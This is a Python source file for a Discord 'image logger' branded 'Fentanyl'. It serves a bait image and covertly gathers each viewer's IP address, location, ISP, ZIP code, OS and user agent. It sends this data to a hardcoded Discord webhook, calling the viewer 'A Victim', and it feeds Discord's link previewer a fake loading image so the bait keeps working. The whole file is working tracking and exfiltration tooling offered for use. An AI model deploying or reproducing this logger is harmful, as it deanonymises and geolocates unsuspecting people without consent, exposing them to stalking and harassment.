from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1077316604586643528/9ZRwlph5iumiR30W-iR50KRjLBcF4HRcz0mqh7MmUX8VYwRCewbnbLi3gJOB2x6JxWb6'
bindata = requests.get('data:image/webp;base64,UklGRmoSAABXRUJQVlA4WAoAAAAQAAAAfwEA4wAAQUxQSJsBAAABkKNtk2Irf9W9uOTuErlb6p7eEHbAwwLc3T0+EQsg84gVEFnk7kxX9Y+dOfgptCNiAvBT2K0ngv/M9fGQuBMMeMJbQyCBN4UVzysCbwa94nZo5Jk550PCbjrdE6/1R9jNoLtXPAgJPfc8DxJ6iecR883MuBoaeW68PwISctM/5YnnEPGCKXT7yBPXQyJu7Ft+yo1LoeEG9L9d5/YISLzhEtOnPPFKD4S7YjOrJl7xJCTaBDPoNRPXQoMN6LjK1Mw8r4IGm2Idq2Zu+eV8aKwJhj+nNXPjiwXQtkpV5ceuHTjLVMNTfrsSqqLyE6giKnVVRERVRKVlFVH56lU/EvwEKubTrIab+xq0yQJB366dhw7+4A/tP/aKtdzcGnsPHWx3D+3s6gvBrOv0/OP3li1lz+2v8/pMjLvD6qewJff0tmqHeWdcg5UHfsXGHVrkGe+YB7/57/4WfsX/xf/F/8X/xf/F/8X/xf+/xebw+0Mwh9+fgNk9x17x/19DGX7/GGT4uTP8/p8zh1/xfwFkDr/i/+L/4v/i/+L/rxYAVlA4IKgQAABQeACdASqAAeQAPxGAtlQsKCssqNcasZAiCWNuul2ZTmX5654nbUP0Z7d3zOed9ZT+P28F1Y+Gun7nu7k/tWscem7sn+d//vCFK5BifHJrG50DgnjeULlAho9syMKdQezJR2jQSNFhwjqH+Kk93xAPvpWTtWMV0WuqNBHkvsUprjVZatPAEBzRsCyEXQmVqKSoFY1kGp4liv7ZPuvmbj8BLE9xZU2sEm8utLwudX1ZrkzqJntvU7y22CQKEL1YogmARXq+ksNWdbIqnslBs8dmSaZw0QX9HHXHhqL2EsXNXtUdMzv21DL/57ILOUMULkal0pcfiJqVOh5lvycnDxiVLPJtuAEJnSyGYNqKSNb0z6rGd0uA2pSpRtFAlfZPgNXuFOjituPz3Vc29zepQCt0ciH49+zgzeFCkaAvjAmiCeNIo+8bo7XmTsfYzcMsw9Aj6ETUBocBDz4+305syD1YeRh2Ufyk62br1ellSYyiF+uChl0w2FJEPj6MPfj4T90G2qcSn29yLe6bCM8pjdGOxCWH4huOMUGKEO35BRRb2/Xk9S7cAgMsJD1fej1uYADkOKkqoTkyPI4j5vIdfxdkbQ5VlE8f+ueAyMXxF+7u2tvDfcx1iP3BPfCHUZJHTrCe5EEVQs5qiDu85eLc3eXDPS60zGbG7wnqdO+6luF+K4NUahqiAmr1npBL5Dv+U9VxzPUihLlhFTUUb3WwyNeQt+PUzqyScj6kT+/6nsLxazR4uSXHCk2m1pyYf6BTxsRoljkejQuOSWldKuiU6jw3DTnGp/+PoV7mgDmDGnoBMpjLUksuS4Ea1TeSczkhQ+Vlf4qMWt7skQeEj91r87i1pzEbTlwQDdB/IcuwqMjhTenMsu0fQLwRVOrE3Y5vYaWbBBk1H8hdXFZhOIgwxXSuP5RD/+ZhHEm+0nAZ01iJoZqmlJhRHm1k9Ko9W8luPEzS8Krz/NbuiI1CruuvrEcC/I61omDDlbwbbn861x7xMTugBIs2OiHypr+oRkfuwrXYl91sY2ueuygaKWmGUPyuX1dTR5z7Gz3YDzgxtcG3Z1SPZUz1dnaNcdfY7peVBVkaQjNNCXcTyEETVv7CZYkZB9TvjHSjsOdwrTLKse/mzr8PCI2IyDvjJ1j2Lk5PuLOLbY/BzjVITzeZOFUYDN/u/xHaJaT1cBuBAL1ZgFk5UxrHm6t176J0Dlyt83Xk3rvTjyjoOfj4DIj3FPz/kvyFimrHJXtC+xw3YQyrzFoP80+lkP0SgaJrHgmBlUXrOD4V8tsG6KL82Lg4AAD+8uMABk9jjf022vgJ8eWBt+Ov7WdFn5GbYofeB8xGoBgnVYF85muDwrnG5PnKJ/h+CawENWJX1Vvh2yLZpNbQhPe/ux3zlAN/3qPL+WH4lULLGAMp3KbRe/YlDr7OqY99/ZE8z4ycwfR6vTrqAbId46Kq8wojjbWtRgAR5C864i6KULCCss8zAy7i2iMNaPaFUZJJ3XcBMcp5QG9o85xGMIoHCGrZOEMRILiOkIHoRjgEkA2UcjWdtRPLV7x5NGst/VYsryIQ6N6vdNOiFVkcGU33iZ7AI01mWWJhtTgCYAEepCHtza4uN7/SKb8lD6ChlG/SlT8KvYMORew05OMxCQCh7kin3YqRmvG/5/aYTj2bJufF0bQ44xrV8Shp74RosA9c7kXYnGR/LChjnuLhUAM1afKrEKRG8CzHJnlhPhQS/pJnA90dqNS/F4zc9YdiDPNpFrM4d4JeIyAbXNbdmd/sjK7pHLmjvR9FdKkyhAMwJRNZ/lo5qu58YfPZcn5PkcCdJ72SQqaMJSRhTZgv6w6m/1u7HXHMxo9XFZtNJ+YpV7EOQ7WZ6La9UUAmKtzPrntsRYisNYIMvYfq6CBEy/Rw+CW9nvfxdC5F+t7hY2FZXQfpEdYY602nHTIINLNPr/oWjeN9c3oXcaOPiJ8PL3ydxrM1OjtjpVVjLjgPUpwOklvd4jswrjPGaCSQRK9Hl4FOZU6ax7NiIOlH8nqRPzrz5KTjn/baBdWlJIaHyK0Nm1rhF0K9B25lvAjw3kvkNX7GwYJJMrmI7tlRPOr5W8z5jaRePakyDlfPLX56kZrRdrgCbmHi3Wa0J8w3l1iMajW60JlykI66R01yH+509BHxX2ilYWQwGJnwn0Tp8rX21h+Vl+6aNP7wgabCOsDVGwMqTzWbrQuM5EYW45aSoH1sXGRKmpySA2hlaYWLyNVS8vEMc7BGfx+4rzaUSwsAHlEtkjljrtRqI8vfiw27A0DD7WjWgz7RCB+8SG8f6thRCtsP0SjgbtbnoPHmPZX74E5431TZ/7SAQJoNrbe2wXCjYTEPpfZXc+bMDnk/Pr8kP0W6bbiO3mwwad3k/foJzVnFi7Xb/PxfhkBwT7AAgCx8HFeITBvjwSlcTWb/pIHl3sAFwPu7MqD8zrLI6A8bDy0sKH1UGLlSuBBUTa/hWC6vHw6m+aQfG592tqBiqIFVOKLDOuIde5b00ydNUuDPgukEWdi/yU5yq2bYrh60A+eF0E8heO+QEqj+NQhvY2KoXiJWdQ0nz0TRzQBv2wZIDU7YVGvJXp9u0JXD9Ax37hToZqADKPDfydl5yBQQ6nOy1VWv/xzTnHxXZDJSSTJXrqgIzGSLCghViiX6mA/bF4F4u6oUgMSFlnpmkZz1erP89EFUTj80nF6xOohoj2Nr4cIrHOt5gxX2XRz1CKyvEIFPRTNEMUiAmsuFmVkdxMDFlGIbdazolIckDy52X8cpEbh5X7rnk451cCXDy9JWVdJhS3lBGhYpuZSxTMsz64EA4xvhBh3YIP5lhUl5i4RNnX5CJDGu91sAsLaphTye5lZAKfSpQCkYtU7HOt3xlNVBAEx0G6cPQFJKfpR1h1SNg1uyPld2Jg6PVNNZMUTBaT1lZmis0wN2+GU3f9Lq/T4RVF4mBLx0Gn75CoCn9FB0bYROVAZ6rIgAJaqxJdU3wbUSqOXRhBWimyY8q79ynuHAyopJbHqT8LlBz+cdN+GyM2nEQ2oeNOw1ZII7Kk8XGgfd+9rMbRY1hLxq7qVirCzd0J01hJLAXFVeBIx0Nx1COYQdh9zxfTdy0sRcoqfPS2lXZylQpOPQm6NcOhVoXWDDVIsgtI4G6bLXv1AjgWAbkBoK2INKtugADRXrCG45c5YjhMq/Mfx27a/f+t2cXk5CEPBs6tjfZ1m9BNIRHRUIXcGd5/CYBEHNIA+GB6o29fTEeA/+54u0Xdwko7xmDZtThoDuAPcb8R55YKltWLzdQDW3i1WILUaYpTRyM6ZGWEOmIN+1zQ4Ks9wIcN0mBQ3zFtohDzN/Tok7lt+e2V05gMBByf6XJD4P1cvz0o72SpFGn2reiYjt6n/EsPCtp+nZDDow/UteBndg04tq4gLSmUY49ZCIORcbW72ajA7AxDOk4DigB/d7rjxNR7BuAkk4X5eB2GO0ui4PJ2MuXeieQzLkwPKwQoKbWNonWhNyui863blJ31kil4QapeMfAPAYe6ok3OHpbN5NiDeZ8LY4Yx+gv8rJ779Qtn3NjULydmrX62L3YltHL9jHXxEEtXYvUhHOX6ITCfsYuziIrTGeCV0cp4+7MuW6BA24ux92wVZBfA9KcEipDbNHr52sVcnUkPxv0NOHQShoT2Dc7eY/h4tExCzNZzaAA71To3ajCLC4tssagTLpkURmqbZNA5Z8lEQbGKYFYyrVHBTFb5DXj7nZ3hvsm3i99EkOevN5PqYBFd8465vS/60DeEBW8fThf3hrIsDfcKPltvsP1M5jBA5oKsx060oIzukBTJaZEkqsADFdjpEKFeFOpWlcdKNLlLml2dDGL62ozgGRQGVIm4X+0dhxowKUkmoahoGBc+Q/DhWgDMYAzcnFY9zQGzUL39hATzEYV/JD5wvY65YJMM2AQ19/2m0lF4IvzbhW6/p1I95L3U8rAQntd/cu/gxGbn0ZLOsGPeKD87jOKCW02VCAypzypYAjXCXXV1V58LKnz1+xh1V51eKqHfUhJ2mxhDywxb+ieDXYhSPOXaGr/Ef3uAMX5JhjclHWVtbU9ovxHDE9TanbQSHlAVZkYsqiWN42BG53fTAXBeQzGT+JQeKC+S5jdvg1mt3F1phVlysk6d4/XpEj982+p6My2/hM1lAx72PPsi8vQRBaqAgSDKa7OIdLhiKgmREPayNEtsb0HZDUjujxsAWhT4L6zqnb9namEo4BT8s7vbJxQCZv13xPmtjKJEX2F0mDWiiv54SrKZrYXbejuUI5piYdNtUPG1D3BUzcaEGZJVIA5/+b5PxInSOS93Ykj8iW+4r6VaPj0O7Q776bYmLHJcXhwmSUUGv4WBKqBvs9JgE0Kl6UnuBoJqHUKebT9ONyEj11p4fBOI/w8mHB41cH0pyXvG1SU52+DdgWnW+9ubwB+87uvx3g5xpamVdL+LjMV1FkP6VwYPv03wzNNsPc0e2cZ2qhexYtlCxakihliEHF4Ghuh4MoSU14cPXJm8MzlDf0zcsqcP70/lVgfZtTo3bUOm1N6au+IgWLyp3kvdzqNa6HOy1LzIcGdZEgt8l3pypZLl1JfjN3+b0tSDeAivU4TB8gwcAR2qpdxtfMe+3rLn7C7koT+2e58L3goMQO56RiZvQ+Mh/+AwE3ebxyqgtku7xEuNH6ZHo2AzvVeVkkTgmNFK/+mFQMjxpSqz+CXfBJLw5sM9AhdzmkqNj9ONucxkB1QlwQiMzAMpTEdSTsDUUq7y/5HAgR/O/MlKaR8qVzyttNOdU60P9KGXrnsVoh5eqxI/LFP2pO/+HU0gNji3566bK08JFkImfCwqGNSXJ2lZVaoL6ool1zAQh1tJ3ZUHXrsCf+R2RZi4S4RF/XJHG3+YXgozoUedltQULDjROYyX3WZII3Mgrwv3KgKv0lZmaD0CPunK+9WqXST2sW1W2D5WKi1x0p1Uikgb+uImuVmsJAl74DqT9WLFt1bdPbDNC57KXbMM3ux0BlQkTLh28okmktu8Zw+ZuakKkDVZMp0b/1e/wV8ofOD5VSC1I3XIflH/yZbFDzUJ3tJcSvKBpD7cDx9jkZOTwAQK3qldndM0Phd8FeMElNNCLWUDh7gxGYVqOOl7f97LEQJoJ9I5A6HcqLDRdQVfFNzCAtLEyKbg9WJ7PJh1Hi6ZKxffxpuPm5xJIJ2VaupcZZe2zeRqNHxbpOpu+fYOnn8yMqibBB2CGst0RS7EV/lMHNcNWlYL7kZTTLJgN/yJeSfKadh4PNnlc6AQniPum+qBuyl3ixCkNepKeF0Du5TEjlDZjei1tpLKjzVhUT6KtdMn3BDULEuocFiG351yRlLHlfoWCy1NItLhwoznROQi6dRwWMh3OOqrrlakT/VFS3Ap02rvYWDO2fdLiwJHERfMu8E8IJ/YW36IkxmWM/3pxG9GavIGooJkZWpZbI0b6UJiwY7zanxgIhUNB6nQuN7e7bkz4zvE/xv6Lzzg1BKhx/zh/XlTzeGtSfutYNdB2X0U+woF/TfZa4t1slqX33ORHv89ARazeC/GvBM5hcJrAGrOig1jVBVpWXDO7LuBwaYsJSbyBNMW+mzGolN60Qri+qA/Wl1cBoKYMDWCM59EHrkvhAbob01g4EyvLhY9Jy3Jk0pbd+zFCudKZnMydFsTDQl+5Pv6gAj0dev8rzAAAA').content

buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}


# This long bit of Base85 encoded Binary is an image with no actual content, which creates a loading image on discord.
# It's not malware, if you don't trust it read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious
# I've already disproved every single one. You aren't helping.
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = requests.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); requests.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = requests.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); requests.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
